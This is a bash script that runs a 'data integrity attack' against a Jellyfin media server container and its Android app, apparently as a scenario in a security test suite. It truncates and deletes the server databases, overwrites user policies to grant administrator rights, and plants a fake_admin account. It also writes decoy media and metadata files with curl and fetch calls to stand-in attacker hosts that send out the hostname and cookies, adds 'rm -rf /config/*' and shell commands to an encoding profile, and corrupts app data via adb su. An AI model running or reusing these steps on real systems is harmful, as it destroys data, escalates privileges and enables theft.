#!/usr/bin/env bash
# vuln_scenario_1: Data integrity attack on Jellyfin media server
# - Corrupt media library database (integrity)
# - Tamper with user preferences and settings (integrity)
# - Inject malicious metadata and configurations (integrity)
# - Manipulate transcoding settings and media file references
# - Corrupt user authentication and authorization data
# - Inject fake media items and library entries
#
# Usage:
#   - From app root: ./vuln_scenarios/vuln_scenario_1/vuln.sh
#   - Or from scenario dir: ./vuln.sh

set -euo pipefail
IFS=$'\n\t'

SCENARIO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCENARIO_DIR/../.." && pwd)"

log(){ printf '[vuln1] %s\n' "$*"; }
warn(){ printf '[vuln1][warn] %s\n' "$*" >&2; }

# Configuration
JELLYFIN_CONTAINER="${JELLYFIN_CONTAINER:-jellyfin-server}"
JELLYFIN_HOST="${JELLYFIN_HOST:-localhost}"
JELLYFIN_PORT="${JELLYFIN_PORT:-8096}"
ANDROID_APP_PACKAGE="${ANDROID_APP_PACKAGE:-org.jellyfin.mobile}"

corrupt_media_database() {
    log "Corrupting Jellyfin media library database"

    if ! command -v docker >/dev/null 2>&1; then
        warn "Docker not available; skipping database corruption"
        return 0
    fi

    # Check if Jellyfin container is running
    if ! docker ps --filter "name=$JELLYFIN_CONTAINER" --filter "status=running" -q | grep -q .; then
        warn "Jellyfin container not running; skipping database corruption"
        return 0
    fi

    # Corrupt main database files
    log "Corrupting main Jellyfin database files"
    docker exec "$JELLYFIN_CONTAINER" sh -c '
        # Corrupt library database
        find /config/data -name "library.db*" -exec truncate -s 0 {} \; 2>/dev/null || true
        find /config/data -name "jellyfin.db*" -exec rm -f {} \; 2>/dev/null || true

        # Create corrupted database with invalid data
        echo "CORRUPTED_DATABASE_CONTENT" > /config/data/library.db 2>/dev/null || true
        echo "INVALID_SQL_DATA" > /config/data/jellyfin.db 2>/dev/null || true

        # Corrupt activity logs
        find /config/data -name "activitylog.db*" -exec truncate -s 50 {} \; 2>/dev/null || true
    ' || warn "Failed to corrupt database files"

    log "Media database corruption completed"
}

tamper_user_settings() {
    log "Tampering with user settings and preferences"

    if ! command -v docker >/dev/null 2>&1; then
        warn "Docker not available; skipping user settings tampering"
        return 0
    fi

    # Check if Jellyfin container is running
    if ! docker ps --filter "name=$JELLYFIN_CONTAINER" --filter "status=running" -q | grep -q .; then
        warn "Jellyfin container not running; skipping user settings tampering"
        return 0
    fi

    # Modify user configuration files
    log "Modifying user configuration and policy files"
    docker exec "$JELLYFIN_CONTAINER" sh -c '
        # Find and corrupt user policy files
        find /config/data/users -name "policy.json" -exec sh -c "
            echo \"{\\\"IsAdministrator\\\":true,\\\"IsHidden\\\":false,\\\"IsDisabled\\\":false,\\\"InvalidField\\\":true}\" > \"{}\"
        " \; 2>/dev/null || true

        # Corrupt user configuration files
        find /config/data/users -name "config.json" -exec sh -c "
            echo \"{\\\"InvalidConfig\\\":true,\\\"CorruptedData\\\":\\\"malicious\\\"}\" > \"{}\"
        " \; 2>/dev/null || true

        # Create fake user directories with malicious content
        mkdir -p /config/data/users/fake_admin 2>/dev/null || true
        cat > /config/data/users/fake_admin/policy.json << EOF
{
  "IsAdministrator": true,
  "IsHidden": false,
  "IsDisabled": false,
  "EnableAllDevices": true,
  "EnableAllChannels": true,
  "EnableAllFolders": true,
  "MaliciousField": "injected_by_attacker",
  "BypassAuth": true
}
EOF
    ' 2>/dev/null || warn "Failed to tamper with user settings"

    log "User settings tampering completed"
}

inject_malicious_metadata() {
    log "Injecting malicious metadata and media configurations"

    if ! command -v docker >/dev/null 2>&1; then
        warn "Docker not available; skipping metadata injection"
        return 0
    fi

    # Check if Jellyfin container is running
    if ! docker ps --filter "name=$JELLYFIN_CONTAINER" --filter "status=running" -q | grep -q .; then
        warn "Jellyfin container not running; skipping metadata injection"
        return 0
    fi

    # Create malicious media files and metadata
    log "Creating malicious media files with corrupted metadata"
    docker exec "$JELLYFIN_CONTAINER" sh -c '
        # Create fake media directories
        mkdir -p /media/Corrupted_Movies 2>/dev/null || true
        mkdir -p /media/Malicious_TV 2>/dev/null || true

        # Create fake media files with executable content
        cat > /media/Corrupted_Movies/malware.mp4 << EOF
#!/bin/bash
# This is not a video file but a malicious script
echo "Malicious payload executed" > /tmp/compromised.txt
curl -X POST http://evil.example.com/exfiltrate -d "host=\$(hostname)"
EOF
        chmod +x /media/Corrupted_Movies/malware.mp4 2>/dev/null || true

        # Create corrupted NFO files with malicious content
        cat > /media/Corrupted_Movies/malware.nfo << EOF
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<movie>
    <title>Legitimate Movie</title>
    <malicious_script>
        <![CDATA[
        <script>
            // Malicious JavaScript payload
            fetch("http://attacker.com/steal", {
                method: "POST",
                body: document.cookie
            });
        </script>
        ]]>
    </malicious_script>
    <plot>This file contains hidden malicious content</plot>
</movie>
EOF

        # Create corrupted playlist files
        cat > /media/malicious_playlist.m3u << EOF
#EXTM3U
#EXTINF:-1,Fake Movie
http://evil.example.com/malware.mp4
#EXTINF:-1,Another Fake
/bin/sh -c "echo compromised > /tmp/hacked.txt"
EOF
    ' 2>/dev/null || warn "Failed to inject malicious metadata"

    log "Malicious metadata injection completed"
}

corrupt_system_configuration() {
    log "Corrupting Jellyfin system configuration files"

    if ! command -v docker >/dev/null 2>&1; then
        warn "Docker not available; skipping configuration corruption"
        return 0
    fi

    # Check if Jellyfin container is running
    if ! docker ps --filter "name=$JELLYFIN_CONTAINER" --filter "status=running" -q | grep -q .; then
        warn "Jellyfin container not running; skipping configuration corruption"
        return 0
    fi

    # Corrupt main system configuration
    log "Corrupting main system configuration files"
    docker exec "$JELLYFIN_CONTAINER" sh -c '
        # Backup and corrupt system.xml
        cp /config/system.xml /config/system.xml.backup 2>/dev/null || true
        cat > /config/system.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<ServerConfiguration xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <IsStartupWizardCompleted>true</IsStartupWizardCompleted>
  <MaliciousConfig>injected_by_attacker</MaliciousConfig>
  <InvalidXMLStructure>
    <UnclosedTag>
      <CorruptedData>This will break XML parsing
  </CorruptedData>
  <PublicHttpsPort>-1</PublicHttpsPort>
  <HttpServerPortNumber>99999</HttpServerPortNumber>
  <InvalidField>malicious_value</InvalidField>
</ServerConfiguration>
EOF

        # Corrupt network configuration
        cat > /config/network.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<NetworkConfiguration>
  <UDPPortRange>invalid_range</UDPPortRange>
  <MaliciousRedirect>http://attacker.com/hijack</MaliciousRedirect>
  <CorruptedNetworkSettings>true</CorruptedNetworkSettings>
  <InvalidPort>-99999</InvalidPort>
</NetworkConfiguration>
EOF
    ' 2>/dev/null || warn "Failed to corrupt system configuration"

    log "System configuration corruption completed"
}

corrupt_transcoding_settings() {
    log "Corrupting transcoding and media processing settings"

    if ! command -v docker >/dev/null 2>&1; then
        warn "Docker not available; skipping transcoding corruption"
        return 0
    fi

    # Check if Jellyfin container is running
    if ! docker ps --filter "name=$JELLYFIN_CONTAINER" --filter "status=running" -q | grep -q .; then
        warn "Jellyfin container not running; skipping transcoding corruption"
        return 0
    fi

    # Corrupt encoding settings
    log "Corrupting media encoding and transcoding configuration"
    docker exec "$JELLYFIN_CONTAINER" sh -c '
        # Create malicious encoding profiles
        mkdir -p /config/encoding 2>/dev/null || true
        cat > /config/encoding/malicious_profile.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<EncodingProfile>
  <Name>Malicious Profile</Name>
  <Container>mp4</Container>
  <Type>Video</Type>
  <MaliciousCommand>/bin/sh -c "curl http://attacker.com/pwned"</MaliciousCommand>
  <VideoCodec>libx264</VideoCodec>
  <AudioCodec>aac</AudioCodec>
  <InvalidSettings>
    <Command>rm -rf /config/*</Command>
  </InvalidSettings>
</EncodingProfile>
EOF

        # Corrupt transcoding cache
        find /config/transcoding-temp -type f -exec truncate -s 0 {} \; 2>/dev/null || true
        find /config/cache -type f -name "*.jpg" -exec rm -f {} \; 2>/dev/null || true

        # Create fake transcoded files pointing to malicious content
        mkdir -p /config/transcoding-temp 2>/dev/null || true
        echo "#!/bin/bash\necho malicious > /tmp/transcoding_compromised" > /config/transcoding-temp/malicious.m3u8
    ' 2>/dev/null || warn "Failed to corrupt transcoding settings"

    log "Transcoding settings corruption completed"
}

inject_android_app_corruption() {
    log "Corrupting Jellyfin Android app data"

    if ! command -v adb >/dev/null 2>&1; then
        warn "adb not found; skipping Android app corruption"
        return 0
    fi

    # Wait for device
    adb wait-for-device >/dev/null 2>&1 || true

    # Check if device is connected
    if ! adb devices | awk 'NR>1 && $2=="device" {print $1}' | grep -q .; then
        warn "No Android device connected; skipping app corruption"
        return 0
    fi

    # Check if app is installed
    if ! adb shell pm list packages | tr -d '\r' | grep -q "^package:${ANDROID_APP_PACKAGE}$"; then
        warn "Jellyfin app not installed; skipping app corruption"
        return 0
    fi

    # Corrupt app data directories
    local app_data_dir="/data/data/${ANDROID_APP_PACKAGE}"
    local databases_dir="${app_data_dir}/databases"
    local shared_prefs_dir="${app_data_dir}/shared_prefs"

    log "Corrupting Jellyfin Android app databases and preferences"

    # Corrupt app databases
    if adb shell su -c "ls '$databases_dir' >/dev/null 2>&1" 2>/dev/null; then
        adb shell su -c "find '$databases_dir' -name '*.db' -exec truncate -s 10 {} \;" 2>/dev/null || true
        adb shell su -c "echo 'CORRUPTED_DB' > '$databases_dir/jellyfin.db'" 2>/dev/null || true
        log "App databases corrupted"
    fi

    # Corrupt shared preferences with invalid XML
    if adb shell su -c "mkdir -p '$shared_prefs_dir'" 2>/dev/null; then
        echo '<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<map>
    <string name="server_url">http://malicious.server.com</string>
    <string name="access_token">corrupted_token_123</string>
    <unclosed_tag>
        <invalid_xml_structure>
            <corrupted_data>This will break XML parsing
        </invalid_xml_structure>
    <boolean name="ssl_verification" value="invalid_boolean" />
    <string name="user_id">../../../root</string>
</map>' | adb shell su -c "tee '$shared_prefs_dir/jellyfin_corrupted.xml'" >/dev/null 2>&1 || true
        log "App shared preferences corrupted"
    fi
}

main() {
    log "Starting vuln_scenario_1 (integrity attack) for Jellyfin media server"

    corrupt_media_database
    tamper_user_settings
    inject_malicious_metadata
    corrupt_system_configuration
    corrupt_transcoding_settings
    inject_android_app_corruption

    log "Data integrity attack completed"
}

main "$@"